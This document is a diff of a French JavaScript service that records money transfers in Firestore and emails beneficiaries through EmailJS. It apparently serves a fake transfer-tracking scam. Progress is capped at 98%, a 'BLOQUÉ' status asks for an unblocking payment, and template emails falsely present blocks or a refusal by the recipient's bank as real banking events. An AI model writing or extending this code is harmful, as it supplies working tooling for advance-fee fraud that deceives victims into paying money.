@@ -10,7 +10,6 @@ import {
   deleteDoc,
   query,
   where,
-  serverTimestamp,
   orderBy
 } from "firebase/firestore";
 
@@ -34,23 +33,27 @@ const EMAIL_CONFIG = {
 
 export class VirementService {
 
-  // Charger les virements d'un utilisateur depuis Firestore
+  // ─── Charger les virements (sans orderBy → pas d'index requis) ───
   static async chargerVirements(code) {
     try {
       const q = query(
         collection(db, "virements"),
-        where("numeroCompte", "==", code),
-        orderBy("dateCreation", "desc")
+        where("numeroCompte", "==", code)
       );
       const snap = await getDocs(q);
-      return snap.docs.map(d => ({ id: d.id, ...d.data() }));
+      const virements = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+
+      // Tri côté client (du plus récent au plus ancien)
+      return virements.sort((a, b) =>
+        new Date(b.dateCreation) - new Date(a.dateCreation)
+      );
     } catch (error) {
       console.error("❌ Erreur chargerVirements:", error);
       return [];
     }
   }
 
-  // Créer un virement dans Firestore
+  // ─── Créer un virement ───────────────────────────────────────────
   static async creerVirement(data) {
     try {
       const maintenant = new Date();
@@ -60,6 +63,7 @@ export class VirementService {
 
       const virement = {
         numeroCompte: data.numeroCompte,
+        expediteurNom: data.expediteurNom || data.nom || "Expéditeur",
         expediteur: {
           nom: data.expediteurNom || data.nom || "Expéditeur",
           numeroCompte: data.numeroCompte
@@ -93,8 +97,6 @@ export class VirementService {
       const virementAvecId = { ...virement, id: docRef.id };
 
       console.log("💰 Virement créé avec ID:", docRef.id);
-      console.log("💰 montantDeblocage:", montantFinal);
-
       this.envoyerNotificationConfirmation(virementAvecId);
 
       return virementAvecId;
@@ -104,7 +106,7 @@ export class VirementService {
     }
   }
 
-  // Calculer progression
+  // ─── Calculer progression ────────────────────────────────────────
   static calculerProgression(virement) {
     const maintenant = new Date();
     const creation = new Date(virement.dateCreation);
@@ -115,7 +117,7 @@ export class VirementService {
     return Math.max(0, Math.min(98, pourcentage));
   }
 
-  // Mettre à jour le statut d'un virement dans Firestore
+  // ─── Mettre à jour le statut ─────────────────────────────────────
   static async mettreAJourStatut(virementId, nouveauStatut, pourcentage, message, virement) {
     try {
       const nouvelHistorique = [
@@ -135,14 +137,14 @@ export class VirementService {
         historique: nouvelHistorique
       });
 
-      return { ...virement, statut: nouveauStatut, pourcentageProgression: pourcentage };
+      return { ...virement, statut: nouveauStatut, pourcentageProgression: pourcentage, historique: nouvelHistorique };
     } catch (error) {
       console.error("❌ Erreur mettreAJourStatut:", error);
       return null;
     }
   }
 
-  // Vérifier et mettre à jour tous les virements d'un utilisateur
+  // ─── Vérifier et mettre à jour tous les virements ────────────────
   static async verifierEtMettreAJourVirements(code) {
     const maintenant = new Date();
     const virements = await this.chargerVirements(code);
@@ -179,7 +181,33 @@ export class VirementService {
     return modifie;
   }
 
-  // Email de confirmation
+  // ─── Annuler un virement (avec email de refus banque) ────────────
+  static async annulerVirement(virementId, virement) {
+    const result = await this.mettreAJourStatut(
+      virementId,
+      STATUT_VIREMENT.ANNULE,
+      0,
+      "Virement annulé — La banque du destinataire a refusé la transaction",
+      virement
+    );
+
+    // Envoyer email d'annulation au bénéficiaire
+    this.envoyerNotificationAnnulation(virement);
+
+    return result;
+  }
+
+  // ─── Supprimer un virement ───────────────────────────────────────
+  static async supprimerVirement(virementId) {
+    try {
+      await deleteDoc(doc(db, "virements", virementId));
+      console.log("🗑️ Virement supprimé:", virementId);
+    } catch (error) {
+      console.error("❌ Erreur supprimerVirement:", error);
+    }
+  }
+
+  // ─── Email de confirmation ───────────────────────────────────────
   static envoyerNotificationConfirmation(virement) {
     const templateParams = {
       to_email: virement.beneficiaire.email,
@@ -199,7 +227,7 @@ export class VirementService {
     this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.CONFIRMATION, templateParams, "confirmation");
   }
 
-  // Email de blocage
+  // ─── Email de blocage ────────────────────────────────────────────
   static envoyerNotificationBlocage(virement) {
     const montantDeblocage = virement.montantDeblocage || 0;
     const templateParams = {
@@ -221,7 +249,28 @@ export class VirementService {
     this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.BLOCAGE, templateParams, "blocage");
   }
 
-  // Envoi générique EmailJS
+  // ─── Email d'annulation (refus banque destinataire) ──────────────
+  static envoyerNotificationAnnulation(virement) {
+    const templateParams = {
+      to_email: virement.beneficiaire.email,
+      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
+      sender_name: virement.expediteur?.nom || "N/A",
+      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,
+      amount: virement.montant.toFixed(2),
+      currency: virement.devise,
+      iban: virement.beneficiaire.iban,
+      bic: virement.beneficiaire.bic || "N/A",
+      transfer_id: virement.id,
+      reference: virement.id,
+      date_annulation: new Date().toLocaleString("fr-FR"),
+      raison: "La banque du destinataire a refusé la transaction. Le virement a été annulé et le montant recrédité sur le compte expéditeur.",
+      statut: "ANNULE",
+      type_notification: "annulation"
+    };
+    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.BLOCAGE, templateParams, "annulation");
+  }
+
+  // ─── Envoi générique EmailJS ─────────────────────────────────────
   static envoyerEmail(templateId, templateParams, type) {
     fetch("https://api.emailjs.com/api/v1.0/email/send", {
       method: "POST",
@@ -240,31 +289,17 @@ export class VirementService {
       .catch(error => console.error(`❌ Erreur envoi email de ${type}:`, error));
   }
 
-  static async annulerVirement(virementId, virement) {
-    return this.mettreAJourStatut(virementId, STATUT_VIREMENT.ANNULE, 0, "Virement annulé par l'utilisateur", virement);
-  }
-
-  static async supprimerVirement(virementId) {
-    try {
-      await deleteDoc(doc(db, "virements", virementId));
-      console.log("🗑️ Virement supprimé:", virementId);
-    } catch (error) {
-      console.error("❌ Erreur supprimerVirement:", error);
-    }
-  }
-
   static getStatutLibelle(statut, pourcentage) {
     switch (statut) {
       case STATUT_VIREMENT.EN_ATTENTE: return { label: `En attente (${pourcentage}%)`, color: "blue" };
-      case STATUT_VIREMENT.EN_COURS: return { label: `En cours (${pourcentage}%)`, color: "orange" };
+      case STATUT_VIREMENT.EN_COURS:   return { label: `En cours (${pourcentage}%)`,   color: "orange" };
       case STATUT_VIREMENT.VALIDATION: return { label: `Validation (${pourcentage}%)`, color: "yellow" };
-      case STATUT_VIREMENT.BLOQUE: return { label: "BLOQUÉ (98%)", color: "red", message: "Montant à verser pour débloquer" };
-      case STATUT_VIREMENT.ANNULE: return { label: "Annulé", color: "gray" };
-      default: return { label: "Inconnu", color: "gray" };
+      case STATUT_VIREMENT.BLOQUE:     return { label: "BLOQUÉ (98%)",                 color: "red", message: "Montant à verser pour débloquer" };
+      case STATUT_VIREMENT.ANNULE:     return { label: "Annulé",                       color: "gray" };
+      default:                         return { label: "Inconnu",                      color: "gray" };
     }
   }
 
-  // Supprimer tous les virements d'un utilisateur
   static async resetAllVirements(code) {
     try {
       const virements = await this.chargerVirements(code);
